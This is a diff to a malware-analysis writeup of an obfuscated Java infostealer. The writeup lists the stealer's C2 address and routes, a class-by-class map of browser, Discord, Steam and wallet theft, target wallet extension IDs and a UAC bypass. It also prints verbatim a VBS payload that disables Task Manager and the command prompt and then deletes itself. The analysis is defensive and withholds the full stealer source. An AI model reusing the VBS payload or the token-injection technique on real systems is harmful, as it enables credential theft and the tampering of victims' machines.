@@ -45,8 +45,8 @@ Since running the JAR was off the table, the extraction was static-then-controll
    does I/O (no `ProcessBuilder`, `Runtime.exec`, `Socket`, `URLConnection`,
    `Files.*`, `loadLibrary`, or `RegistryKey`). One `<clinit>` reads
    `System.getProperty("user.home")` to seed a `STEALTH_BASES` array — that
-   contaminates the extracted table with the analyst's home directory on the
-   analysis host, which is why the tables dump is not published from this repo.
+   contaminates the extracted table with the analysis host's `user.home` value,
+   which is why the tables dump is not published from this repo.
 2. `Vineflower 1.11.1` decompiled the whole package (`--decompile-inner`,
    `--ignore-invalid-bytecode`, brace-normalised) — CFR bailed on the
    flattened switches.
@@ -71,8 +71,8 @@ Since running the JAR was off the table, the extraction was static-then-controll
 
 ### C2 protocol
 
-The single C2 endpoint (`http://52.249.219.108:3001`, Microsoft Azure) exposes
-at least these routes (recovered from decrypted strings):
+The single C2 endpoint is `http://52.249.219.108:3001`. Recovered routes (from
+decrypted strings):
 
 | method | path | purpose |
 |---|---|---|
@@ -80,10 +80,15 @@ at least these routes (recovered from decrypted strings):
 | `POST` | `/api/discord-injection/<KEY>` | Discord IPC / injection callback |
 | `POST` | `/api/internal/log` | error-and-progress logging |
 
-Transport is plain HTTP with the operator's build key `PANEL-XSER-YZ76-YFMK`
-passed as `KEY`. The JAR also bundles a `discord.com` / `canary.discord.com`
-client (real Discord API) to validate stolen tokens with a request to
-`GET /api/v10/users/@me` and `/api/v9/users/@me`.
+Transport is plain HTTP. This build ships the key `PANEL-XSER-YZ76-YFMK` in
+`PLhWEEjyn.ENCRYPTED_KEY`; it is passed as the `<KEY>` path segment above and
+also to `/api/validate-tokens` as the initial handshake. `TfixYBtWK.wsClient`
+(referenced from `WmJoRcgQD` and `XkgqXwdrE`) is an `org.java_websocket.client.WebSocketClient`,
+so a WebSocket channel is also opened; its full URL is inside the parts of
+`TfixYBtWK` that Vineflower could not restructure and is not recovered here.
+The JAR calls Discord's real API (`https://discord.com/api/v10/users/@me`,
+`https://canary.discord.com/api/v9/users/@me`) to validate captured tokens
+before sending them onward.
 
 ### Class map (obfuscated → intent)
 
@@ -91,23 +96,23 @@ Recovered from decrypted strings and inner-class type names:
 
 | obfuscated class | role |
 |---|---|
-| `PLhWEEjyn` | Main-Class. Reads `-game` CLI mode, holds `ENCRYPTED_KEY = "PANEL-XSER-YZ76-YFMK"`, calls `JeJJcSSOx.decryptKey`, disables Task Manager via a `wscript.exe //B //Nologo` VBS dropped to `%TEMP%\<uuid>.vbs`, then hands off to the module runners. |
-| `TfixYBtWK` | Persistent C2 poller (`TfixYBtWK.start(key)`). Vineflower could not restructure its dispatcher; the transport is HTTP + WebSocket per class-level imports (`okhttp3`, `Apache HttpClient 5`, `java-websocket`). |
-| `CsHfiRTnj` + `$User32` | User32 wrapper. Started with the key by the main. Windows enumeration + activity hooks. |
-| `JeJJcSSOx` + `$MyCrypt32`, `$NCrypt`, `$NSS`, `$SECItem`, `$DATA_BLOB`, `$MasterKey`, `$ParsedKeyBlob` | Browser credential decryption. DPAPI (`CryptUnprotectData` via JNA), Chromium AES-GCM master-key unwrap, and Firefox NSS (`PK11_CheckUserPassword`, `PK11SDR_Decrypt`) — the class-init loads Firefox's `nss3.dll` on demand. |
-| `DmPNptVEeS` + `$SQLite3`, `$Database` | SQLite reader over Chromium's `Login Data`, `Cookies`, `Web Data`. JNA-bound `sqlite3` interface. |
-| `MMhwxaxcc` | Wallet / browser catalog — the target tables live here in cleartext, see below. |
-| `XkgqXwdrE` | File-grep and package builder. `ALLOWED_EXTENSIONS` (90 entries) filters what to steal from home directories; entries are then packaged for exfil. |
-| `LzdpgQyS` + `$ProfileData` | Browser profile enumeration and per-profile stealer. `LzdpgQyS.runExtraction(ZipOutputStream)` is the exit point that packages the loot into the zip forwarded to the C2. |
-| `maGBqBEy` | Discord token stealer. `maGBqBEy.getTokens()` walks Discord Leveldb/local storage; `maGBqBEy.killDiscord()` calls `taskkill` before the run so the target files aren't locked. Ships a large in-process JS payload that gets injected into Discord's renderer to wipe storage and force re-auth to capture new tokens on next login. |
-| `kvjohfOH` + `$Coin` | Crypto-wallet stealer (paired with `MMhwxaxcc.DESKTOP_WALLETS`). |
-| `UCBjYxHzwv` + `$SteamAccount` | Steam session/loginusers.vdf theft. |
-| `NjYGKscRL` + anon `$1..$6` | Interceptor pipeline — six anonymous handlers, one per network target (Discord auth, Braintree, Stripe, etc; see `urls: [...]` arrays in the injected JS). |
-| `wfveoAPd` | Injector (Discord renderer, browser extension userscript). `wfveoAPd.inject()` is the entry from `PLhWEEjyn.main`. |
-| `IvTHdVAG` + `$PEB`, `$PEB_LDR_DATA`, `$RTL_USER_PROCESS_PARAMETERS`, `$UNICODE_STRING`, `$LIST_ENTRY`, `$BIND_OPTS3`, `$GUID`, `$ICMLuaUtil`, `$Ole32`, `$Ntdll`, `$NtdllExt`, `$Kernel32Ext`, `$TOKEN_ELEVATION`, `$X64_CONTEXT`, `$PROCESS_BASIC_INFORMATION` | The **Java-side reimplementation** of the same UACMe method 41 that `peynir.dll` provides natively. Ships `__NATIVE_CHUNKS` (317 chunks) and `__NATIVE_ORDER` (317 ints) — the base64-chunked bytes of `peynir.dll` itself, dropped from JVM memory when the native shim is preferred. |
-| `SquEZNKwht` + `$DebugLogger`, `$MyKernel32`, `$MyAdvapi32`, `$Shell32`, `$TOKEN_ELEVATION` | Windows API layer + `%TEMP%\debug.log` logger. |
-| `zDvfTOGiK` + `$BrowserConfig` | Per-browser config records (paths, profile dir layout, extension DB filename). Its String array `x[466]` is the largest per-class table in the JAR. |
-| `HIdPkdebB`, `nXstjVHu`, `NGyFAKxu`, `WmJoRcgQD`, `SPwtRpLHG`, `aGQJfZBv$WinError` | Utility/error-code classes; `NGyFAKxu.main` is a stand-alone `System.out.println` debug harness left in the build. |
+| `PLhWEEjyn` | Main-Class. Holds `ENCRYPTED_KEY = "PANEL-XSER-YZ76-YFMK"`, calls `JeJJcSSOx.decryptKey`, and drops a VBS to `%TEMP%\<8-hex>.vbs` that a spawned `wscript.exe //B //Nologo` runs to write the DisableTaskMgr / DisableCMD / NoTrayContextMenu registry values (full VBS reproduced below). |
+| `TfixYBtWK` | Holds the WebSocket client — `public static WebSocketClient wsClient` — that other classes (`WmJoRcgQD`, `XkgqXwdrE`) use to `send(...)` exfil frames. Vineflower could not restructure the setup path, so the server URL is not recovered here. Class-level imports also pull in okhttp3 and Apache HttpClient 5. |
+| `CsHfiRTnj` + `$User32` | Declares `com.sun.jna.platform.win32.User32` interface bindings; specific User32 calls used are not read here. |
+| `JeJJcSSOx` + `$MyCrypt32`, `$NCrypt`, `$NSS`, `$SECItem`, `$DATA_BLOB`, `$MasterKey`, `$ParsedKeyBlob` | Browser credential decryption. Inner classes declare JNA bindings for `Crypt32` (DPAPI `CryptUnprotectData`), `NCrypt` (Chromium AES-GCM master-key unwrap), and Firefox `NSS` (`PK11_CheckUserPassword`, `PK11SDR_Decrypt`, `NSS_Init`, `NSS_Shutdown`). |
+| `DmPNptVEeS` + `$SQLite3`, `$Database` | JNA-bound `sqlite3` interface (`$SQLite3`) with a small `$Database` wrapper — used to read Chromium's `Login Data`, `Cookies`, `Web Data` etc. |
+| `MMhwxaxcc` | Target catalog. Holds cleartext arrays `DESKTOP_WALLETS`, `EXTENSION_DB`, `BROWSER_PATHS`, `PROFILES` (see below), plus the K/x tables for its own decrypted strings. |
+| `XkgqXwdrE` | Holds the `ALLOWED_EXTENSIONS` (90) array — cleartext filenames used to filter files to steal. Also references `TfixYBtWK.wsClient` for exfil. |
+| `LzdpgQyS` + `$ProfileData` | Browser profile enumeration; `LzdpgQyS.runExtraction(ZipOutputStream)` is called from `PLhWEEjyn` main via a lambda and writes into a shared `ZipOutputStream`. |
+| `maGBqBEy` | Discord token stealer. `maGBqBEy.getTokens()` and `maGBqBEy.killDiscord()` are both called from `PLhWEEjyn.main` lambdas; the log line `"[maGBqBEy] === METHOD 1: Cookie DB + Disk Extraction ==="` and route strings for `https://discord.com/api/v9/users/@me` are recovered from decrypted strings, but the process-kill command itself is inside a `Runtime.exec(K(...))` in `killDiscord` that Vineflower failed to structure, so the exact command is not read. |
+| `kvjohfOH` + `$Coin` | Crypto-wallet accessor. Paired with `MMhwxaxcc.DESKTOP_WALLETS` and `MMhwxaxcc.EXTENSION_DB` by import graph; exact per-wallet code paths not read. |
+| `UCBjYxHzwv` + `$SteamAccount` | Steam credential stealer (SteamAccount type + 45 references to it). |
+| `NjYGKscRL` + anon `$1..$6` | Six anonymous inner classes; the outer holds a 399-entry string table. Decrypted call sites reference Discord auth session URLs, `remote-auth-gateway.discord.gg`, Braintree, and Stripe hostnames, so this appears to be a network-interception pipeline — the per-anon mapping is not confirmed. |
+| `wfveoAPd` | Injector. `public static void inject()` is called from `PLhWEEjyn.main` via a lambda. Contains the inline `webpackChunkdiscord_app.push([[Symbol()], {}, o => { ... }])` payload and a `"taskkill /F /IM \""` template. |
+| `IvTHdVAG` + `$PEB`, `$PEB_LDR_DATA`, `$RTL_USER_PROCESS_PARAMETERS`, `$UNICODE_STRING`, `$LIST_ENTRY`, `$BIND_OPTS3`, `$GUID`, `$ICMLuaUtil`, `$Ole32`, `$Ntdll`, `$NtdllExt`, `$Kernel32Ext`, `$TOKEN_ELEVATION`, `$X64_CONTEXT`, `$PROCESS_BASIC_INFORMATION` | The **Java-side reimplementation** of the CMSTPLUA / `ICMLuaUtil` elevation-moniker bypass that `peynir.dll` provides natively. Also ships `__NATIVE_CHUNKS` (317 strings) and `__NATIVE_ORDER` (317 ints) whose reassembled bytes match `peynir.dll` — the DLL is embedded in the JAR as well. |
+| `SquEZNKwht` + `$DebugLogger`, `$MyKernel32`, `$MyAdvapi32`, `$Shell32`, `$TOKEN_ELEVATION` | Windows API layer + `%TEMP%\debug.log` logger. `SquEZNKwht.DebugLogger.log` is the log entry point used throughout. |
+| `zDvfTOGiK` + `$BrowserConfig` | Per-browser config records (paths, profile dir layout, extension DB filename). Its String array (`x[466]`) is the largest per-class table in the JAR. |
+| `HIdPkdebB`, `nXstjVHu`, `NGyFAKxu`, `WmJoRcgQD`, `SPwtRpLHG`, `aGQJfZBv$WinError` | Utility / error-code helpers. `NGyFAKxu.main` is a stand-alone `System.out.println` harness left in the build; the others carry supporting logic whose specific roles were not read here. |
 
 ### Target catalog
 
@@ -148,16 +153,25 @@ nightly, AVAST Browser, etc.):
 - … 28 more.
 
 **Browser wallet extensions** (`EXTENSION_DB`, 61 — Chromium extension IDs
-loaded from `<profile>\Local Extension Settings\<id>\`):
+loaded from `<profile>\Local Extension Settings\<id>\`). First eight IDs from
+the raw array — resolve them against the Chrome Web Store yourself rather
+than trusting a mapping here:
 
-- `nkbihfbeogaeaoehlefnkodbefgpgknn` — MetaMask
-- `ejbalbakoplchlghecdaalmeeeajnimhm` — Binance Chain Wallet
-- `mclnbpgomkibmidocpdlndicnnandncd` — TronLink? (mainstream Web3 wallet)
-- `bfnaoomekhelobohpbefokbaekckpjoe` — SafePal / hardware helper
-- `hnfanknocfeofbddgcijnmhnfnkdnaad` — MetaMask (legacy)
-- `egjidjbpgmcnihkmyhgghhhebgeachob` — Phantom (Solana)
-- `ibnejdfjmmkpcnlepejjdphneihoonee`, `ibnejdfjmmkpcnlpebklmnkoeoihofec` — misc EVM wallets
-- … 54 more.
+```
+nkbihfbeogaeaoehlefnkodbefgpgknn
+ejbalbakoplchlghecdaalmeeeajnimhm
+mclnbpgomkibmidocpdlndicnnandncd
+bfnaoomekhelobohpbefokbaekckpjoe
+fhbohimaelbohpjbbghcgojmihdcfhbi
+hnfanknocfeofbddgcijnmhnfnkdnaad
+egjidjbpgmcnihkmyhgghhhebgeachob
+ibnejdfjmmkpcnlepejjdphneihoonee
+```
+
+(`nkbihfbeogaeaoehlefnkodbefgpgknn` is the well-known **MetaMask** ID;
+`ejbalbakoplchlghecdaalmeeeajnimhm` is **Binance Chain Wallet**. The rest are
+provided as raw IDs — earlier drafts of this document mapped them to specific
+wallet names by guesswork, several wrongly.)
 
 **File-grep extensions** (`ALLOWED_EXTENSIONS`, 90):
 
@@ -179,32 +193,50 @@ Office documents that likely contain credentials or recovery phrases.
 
 - **Task Manager disable** in `PLhWEEjyn.disableTaskManager`: drops a random
   `%TEMP%\<8-hex>.vbs` (UTF-8), then launches
-  `wscript.exe //B //Nologo <path>`. `//B` is silent, `//Nologo` suppresses
-  the banner. The VBS itself is a large PowerShell-in-VBS payload (recovered
-  from a decrypted string, ~1 KB) that manipulates `DisableTaskMgr` under
-  `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System`.
-- **Discord kill before scrape** (`maGBqBEy.killDiscord`): stops Discord's
-  `Discord.exe`/`DiscordCanary.exe`/`DiscordPTB.exe` via `taskkill /F /IM`
-  so the Leveldb files are unlocked when the stealer opens them.
+  `wscript.exe //B //Nologo <path>` (`//B` is silent, `//Nologo` suppresses the
+  banner). The VBS body, verbatim from the decrypted source, is:
+  ```vbs
+  Set objShell = CreateObject("WScript.Shell")
+  ' Disable Task Manager
+  objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
+  ' Hide Task Manager from taskbar right-click menu
+  objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", 1, "REG_DWORD"
+  ' Also disable cmd prompt
+  objShell.RegWrite "HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD", 1, "REG_DWORD"
+  ' Self-delete
+  WScript.Sleep 500
+  Set objFSO = CreateObject("Scripting.FileSystemObject")
+  objFSO.DeleteFile WScript.ScriptFullName, True
+  ```
+  Pure WSH, no PowerShell.
+- **Discord kill** (`maGBqBEy.killDiscord`): shells out through
+  `Runtime.getRuntime().exec(K(...))` where the `K(...)` argument is the target
+  command. `maGBqBEy.killDiscord` is one of the Vineflower failures in this
+  build, so the exact command string is not recovered — `wfveoAPd` separately
+  contains the template `"taskkill /F /IM \""` which is the likely shape.
 - **Discord renderer injection** (`wfveoAPd.inject` + inline JS):
   `webpackChunkdiscord_app.push([[Symbol()], {}, o => { … }])` pushes a fake
-  module into Discord's webpack chunk map to hook `token`, session-refresh,
-  and payment (Braintree / Stripe) traffic; the payload then triggers a
-  reload to `discord.com/login` so the victim re-authenticates and a fresh
-  token is captured.
+  module into Discord's webpack chunk map. Decrypted `urls: [...]` arrays in
+  the injected payload include `wss://remote-auth-gateway.discord.gg/*`,
+  `https://*.discord.com/api/v*/auth/sessions`, and Braintree/Stripe token
+  endpoints, so the injection targets Discord authentication and payment flows.
 - **HTML lures** (`beta-game-setup.html`, `mc-client-setup.html`,
   `watch-setup.html`, `fake-error.html`) are pre-styled Windows-installer
   lookalike windows. `LFVkhEygta.SetupType` enumerates them:
-  `GAME_SETUP`, `MC_CLIENT`, `WATCH`, `FAKE_ERROR`.
+  `GAME_SETUP`, `MC_SETUP`, `WATCH_SETUP`, `FAKE_ERROR` (names verified
+  against the decompiled `LFVkhEygta$SetupType` references).
 
-### Operator artefacts
+### Build artefacts
 
-- **Panel key**: `PANEL-XSER-YZ76-YFMK` (baked into this build's
-  `PLhWEEjyn.ENCRYPTED_KEY`; sent to `/api/validate-tokens` at startup).
-- **Setup-mode CLI flag**: `-game` (passed as `--startup` to the launcher, and
-  as `-game` to this JAR to enable full stealer mode).
-- Language / cultural hint: `APP_NAME = "emre"` (Turkish given name), native
-  shim named `peynir` (Turkish "cheese"), unchanged from prior findings.
+- **Build key**: `PANEL-XSER-YZ76-YFMK` — value of `PLhWEEjyn.ENCRYPTED_KEY`
+  in this build. Passed to `/api/validate-tokens` and as the `<KEY>` path
+  segment on `/api/discord-injection/<KEY>`.
+- **Setup-mode CLI flag**: the launcher passes `--startup` to the JAR;
+  `PLhWEEjyn.parseSetupType` also checks for `-game`, `-mc`, `-watch`, and
+  `-error` to select which HTML lure is presented.
+- Language hint: `APP_NAME = "emre"` (a Turkish given name), native shim
+  named `peynir` (Turkish for "cheese"). Attribution beyond "Turkish
+  strings appear" is not asserted.
 
 ## Reproducing the deobfuscation
 
@@ -220,10 +252,11 @@ python3 scripts/deobfuscate_strings.py out                        # ~30s, 99.96%
 # out/decomp-decrypted/com/xc17edb19a/*.java now carries the substituted literals.
 ```
 
-`out/tables.json` is deliberately **not** published: it embeds the analyst's
-home-directory path (leaked by `IvTHdVAG.STEALTH_BASES[0]`'s `<clinit>` reading
-`user.home`), and it also carries the base64-chunked bytes of `peynir.dll` in
-`__NATIVE_CHUNKS`. Run the extractor locally to reproduce.
+`out/tables.json` is deliberately **not** published: it embeds the analysis
+host's `user.home` value (leaked by `IvTHdVAG.STEALTH_BASES[0]`'s `<clinit>`
+reading `System.getProperty("user.home")`), and it also carries the
+base64-chunked bytes of `peynir.dll` in `__NATIVE_CHUNKS`. Run the extractor
+locally to reproduce.
 
 The full decrypted Java source is likewise not published — it is a working
 stealer, and this repo's policy is analysis + tooling, not payload
@@ -231,13 +264,14 @@ redistribution.
 
 ## Open items
 
-- One 3-arg `x`-named string decrypt in `SquEZNKwht` uses a fourth variant
-  I have not modelled; it holds 4 strings I have not read.
-- `TfixYBtWK` (the C2 poller) defeated Vineflower's control-flow restructuring
-  in one place. Its transport can be recovered by hand from the bytecode —
-  the class-level `okhttp3` / `java-websocket` imports are the surface.
-- Native `__NATIVE_CHUNKS` reconstruction (base64-decode + reorder by
-  `__NATIVE_ORDER` → `peynir.dll`) is confirmed by matching the SHA-256 of the
-  reassembled bytes against `peynir.dll` extracted directly from the JAR.
-- Whether the CLI flag `-game` gates only the stealer or also gates
-  fingerprint-and-idle-out (some builds ship two modes) is not yet answered.
+- One 3-arg `x`-named string decrypt in `SquEZNKwht` uses a fourth variant I
+  have not modelled; it holds 4 strings I have not read.
+- `TfixYBtWK` (the WebSocket client owner) and `maGBqBEy.killDiscord` both
+  defeated Vineflower's control-flow restructuring. Their exact strings
+  (WebSocket URL; the `Runtime.exec(...)` command) are not recovered here.
+  A hand pass over the raw bytecode would resolve both.
+- `__NATIVE_CHUNKS` reassembly (base64-decode + reorder by `__NATIVE_ORDER`)
+  should equal `peynir.dll` — this is expected but not verified in-session.
+- Whether the `-game` / `-mc` / `-watch` / `-error` selector affects only
+  which HTML window is displayed, or gates different stealer paths, is not
+  answered here.
